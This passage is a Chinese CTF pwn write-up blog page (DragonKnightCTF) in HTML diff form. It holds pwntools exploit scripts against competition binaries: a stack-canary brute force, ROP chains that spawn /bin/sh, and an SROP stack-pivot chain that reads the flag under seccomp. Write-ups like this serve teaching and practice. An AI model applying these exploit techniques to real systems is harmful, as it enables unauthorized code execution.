class="hljs-number">0x2042</span><br>log.success(<span class="hljs-string">&quot;canary: &quot;</span>+<span class="hljs-built_in">hex</span>(canary))<br>log.success(<span class="hljs-string">&quot;binsh: &quot;</span>+<span class="hljs-built_in">hex</span>(binsh))<br>log.success(<span class="hljs-string">&quot;pie: &quot;</span>+<span class="hljs-built_in">hex</span>(pie))<br><br>gift_addr = pie + <span class="hljs-number">0x149A</span><br>pop_rdi = pie+<span class="hljs-number">0x2072</span> <span class="hljs-comment"># 0x0000000000002072 : pop rdi ; ret</span><br>system_plt = pie + <span class="hljs-number">0x11C0</span><br>ret = pie + <span class="hljs-number">0x101a</span><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+ <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span> + p64(canary) + p64(main_rbp) + p64(pop_rdi) + p64(binsh) +  p64(ret) + p64(system_plt)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.sendline(payload2)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>直接one by one爆破canary，爆破完canary之后就和正常的栈溢出题目没什么不同了,想怎么做怎么做<br>由于这题是静态链接的题，没有libc，所以用read函数写一个’&#x2F;bin&#x2F;sh\x00’，之后用系统调用获取shell</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#p = process(&quot;./pwn_patched&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.qsnctf.com&quot;</span>,<span class="hljs-number">31345</span>)<br>elf=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment">#######################################################</span><br><span class="hljs-comment">#################  explode canary  ####################</span><br><span class="hljs-comment">#######################################################</span><br>p.recvuntil(<span class="hljs-string">b&#x27;please input:\n&#x27;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br>i = <span class="hljs-number">0</span><br>k = <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span>(k&lt;=<span class="hljs-number">8</span>):<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span>(i&lt;=<span class="hljs-number">255</span>):<br>        canary_send = canary + i.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>        payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span> + canary_send<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[Running] explode the &quot;</span> + <span class="hljs-built_in">str</span>(k) + <span class="hljs-string">&quot;th bytes of canary ,now try &quot;</span> + <span class="hljs-built_in">hex</span>(i) + <span class="hljs-string">&quot;, canary: &quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(canary_send)<br>        p.send(payload)<br>        res = p.recvline()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;res: &#x27;</span> + res)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">b&#x27;input&#x27;</span> <span class="hljs-keyword">in</span> res):<br>            canary = canary_send<br>            k+=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            p.recvline()<br>            i+=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span>(i == <span class="hljs-number">256</span>):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[Error] Exploit failed, retry&quot;</span>)<br>                i = <span class="hljs-number">0</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&quot;[Success] canary: &quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(canary)<br><br><span class="hljs-comment">#######################################################</span><br><span class="hljs-comment">################      function     ####################</span><br><span class="hljs-comment">#######################################################</span><br>puts = <span class="hljs-number">0x411770</span><br>write = <span class="hljs-number">0x4489C0</span><br>read = <span class="hljs-number">0x448920</span><br>vuln = <span class="hljs-number">0x401D65</span><br><br><span class="hljs-comment">#######################################################</span><br><span class="hljs-comment">#################    ROPgadget     ####################</span><br><span class="hljs-comment">#######################################################</span><br>pop_rax = <span class="hljs-number">0x4493d7</span> <span class="hljs-comment">#0x00000000004493d7 : pop rax ; ret</span><br>pop_rdi = <span class="hljs-number">0x4018c2</span> <span class="hljs-comment">#0x00000000004018c2 : pop rdi ; ret</span><br>pop_rsi = <span class="hljs-number">0x40f23e</span> <span class="hljs-comment">#0x000000000040f23e : pop rsi ; ret</span><br>pop_rdx = <span class="hljs-number">0x4017cf</span> <span class="hljs-comment">#0x00000000004017cf : pop rdx ; ret</span><br>syscall = <span class="hljs-number">0x4012d3</span> <span class="hljs-comment">#0x00000000004012d3 : syscall</span><br><br>binsh = <span class="hljs-number">0x4c2500</span><br><br><span class="hljs-comment">#######################################################</span><br><span class="hljs-comment">#################       send       ####################</span><br><span class="hljs-comment">#######################################################</span><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span> + canary + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(binsh) + p64(pop_rdx) + p64(<span class="hljs-number">0xffff</span>) + p64(read) + p64(vuln)<br>p.sendline(payload1)<br><br>sleep(<span class="hljs-number">0.1</span>)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>payload2 = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x108</span>+canary+p64(<span class="hljs-number">0</span>)+p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(pop_rdi)+p64(binsh)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>p.recvuntil(<span class="hljs-string">b&#x27;input:&#x27;</span>)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="srop-seccomp"><a href="#srop-seccomp" class="headerlink" title="srop_seccomp"></a>srop_seccomp</h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>srop，不过加上了seccomp，所以只好用open,read,write三个系统调用获取flag<br>先进行栈迁移，将栈迁移到bss段，在bss段构造sigreturnframe，从而ORW获取flag</p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./chall&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.qsnctf.com&quot;</span>,<span class="hljs-number">32252</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#######################################################</span><br><span class="hljs-comment">#################    ROPgadget     ####################</span><br><span class="hljs-comment">#######################################################</span><br>mov_rax_0xf = <span class="hljs-number">0x401193</span> <span class="hljs-comment">#0x0000000000401193 : mov rax, 0xf ; ret</span><br>syscall = <span class="hljs-number">0x40118a</span><br>leave = <span class="hljs-number">0x40143c</span><br>flag_str = <span class="hljs-number">0x404390</span> <br>flag_addr = <span class="hljs-number">0x405050</span><br>bss = <span class="hljs-number">0x404060</span><br><br><span class="hljs-comment">#######################################################</span><br><span class="hljs-comment">#################       send       ####################</span><br><span class="hljs-comment">#######################################################</span><br>sigframe_open = SigreturnFrame()<br>sigframe_open.rax = constants.SYS_open<br>sigframe_open.rdi = flag_str<br>sigframe_open.rsi = <span class="hljs-number">0</span><br>sigframe_open.rdx = <span class="hljs-number">0</span><br>sigframe_open.rip = syscall<br>sigframe_open.rbp = bss + <span class="hljs-number">0x110</span><br>sigframe_open.rsp = bss + <span class="hljs-number">0x110</span><br><br>sigframe_read = SigreturnFrame()<br>sigframe_read.rax = constants.SYS_read<br>sigframe_read.rdi = <span class="hljs-number">3</span><br>sigframe_read.rsi = flag_addr<br>sigframe_read.rdx = <span class="hljs-number">0x100</span><br>sigframe_read.rip = syscall<br>sigframe_read.rbp = bss + <span class="hljs-number">0x220</span><br>sigframe_read.rsp = bss + <span class="hljs-number">0x220</span><br><br>sigframe_write = SigreturnFrame()<br>sigframe_write.rax = constants.SYS_write<br>sigframe_write.rdi = <span class="hljs-number">1</span><br>sigframe_write.rsi = flag_addr<br>sigframe_write.rdx = <span class="hljs-number">0x100</span><br>sigframe_write.rip = syscall<br>sigframe_write.rbp = bss + <span class="hljs-number">0x330</span><br>sigframe_write.rsp = bss + <span class="hljs-number">0x330</span><br><br>payload1  = p64(<span class="hljs-number">0xaaaa</span>) + p64(mov_rax_0xf) + p64(syscall) + <span class="hljs-built_in">bytes</span>(sigframe_open)<br>payload1 += p64(<span class="hljs-number">0xaaaa</span>) + p64(mov_rax_0xf) + p64(syscall) + <span class="hljs-built_in">bytes</span>(sigframe_read)<br>payload1 += p64(<span class="hljs-number">0xaaaa</span>) + p64(mov_rax_0xf) + p64(syscall) + <span class="hljs-built_in">bytes</span>(sigframe_write)<br>payload1 += <span class="hljs-string">b&#x27;flag&#x27;</span><br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2a</span> + p64(bss) + p64(leave)<br><br>p.recvuntil(<span class="hljs-string">b&quot;easyhack\n&quot;</span>)<br>p.send(payload1)<br>p.recvuntil(<span class="hljs-string">b&#x27;Do u know what is SUID?\n&#x27;</span>)<br>p.send(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+        <a href="/tags/WP/" class="print-no-link">#WP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DragonKnightCTF wp</div>
+      <div>https://voidchunk.github.io/2024/05/27/DragonKnightCTF-wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>voidchunk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-cc-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/29/BUUCTF-wp/" title="BUUCTF wp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BUUCTF wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/20/ciscn2024-%E5%88%9D%E8%B5%9B-wp/" title="ciscn2024 初赛 wp">
+                        <span class="hidden-mobile">ciscn2024 初赛 wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"voidchunk/voidchunk.github.io","repo-id":"R_kgDOL3zepA","category":"Announcements","category-id":"DIC_kwDOL3zepM4CftjK","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":0,"emit-metadata":0,"input-position":"top","lang":"zh-CN","loading":"lazy","crossorigin":"anonymous"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
